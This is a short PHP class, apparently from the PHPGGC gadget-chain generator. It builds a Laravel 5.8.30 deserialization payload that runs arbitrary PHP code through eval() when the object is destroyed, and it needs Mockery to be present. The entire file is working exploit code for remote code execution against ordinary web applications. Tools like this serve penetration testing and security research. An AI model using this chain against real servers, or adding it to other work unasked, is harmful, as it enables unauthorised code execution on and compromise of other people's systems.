<?php

namespace GadgetChain\Laravel;

class RCE5 extends \PHPGGC\GadgetChain\RCE\PHPCode
{
    public static $version = '5.8.30';
    public static $vector = '__destruct';
    public static $author = 'Phith0n';
    public static $information = '
        Executes given PHP code through eval().
        Requires Mockery, which is in the require-dev package. 
    ';

    public function generate(array $parameters)
    {
        $code = '<?php ' . $parameters['code'] . ' exit; ?>';
        return new \Illuminate\Broadcasting\PendingBroadcast($code);
    }
}